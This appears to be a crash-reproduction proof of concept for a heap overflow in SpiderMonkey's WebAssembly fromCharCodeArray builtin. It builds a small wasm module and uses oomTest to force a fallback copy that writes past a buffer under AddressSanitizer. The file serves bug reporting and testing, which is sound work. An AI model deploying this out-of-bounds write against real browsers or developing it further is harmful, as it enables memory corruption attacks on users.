// Minimal PoC 1: ASan crash (50 elements)
// Requires SpiderMonkey shell built with ASan and with wasm.gc + wasm.stringref enabled.
// Run: ./js poc-crash-asan.js

let wat = `(module
  (type $arr (array (mut i16)))
  (func $fromCharCodeArray
    (import "wasm:js-string" "fromCharCodeArray")
    (param (ref null $arr) i32 i32)
    (result (ref extern)))
  (func (export "test") (result externref)
    ;; 50 elements → bug writes 100 uint16_t (exceeds ~49-capacity Vector)
    (call $fromCharCodeArray
      (array.new $arr (i32.const 0x41) (i32.const 50))
      (i32.const 0)
      (i32.const 50)))
)`;

let bytes = wasmTextToBinary(wat);
let mod = new WebAssembly.Module(bytes, {builtins: ['js-string']});
let inst = new WebAssembly.Instance(mod, {}).exports;

// Force NoGC string allocation to fail → triggers fallback with buggy copy
oomTest(
    () => {
        inst.test() 
    },
);

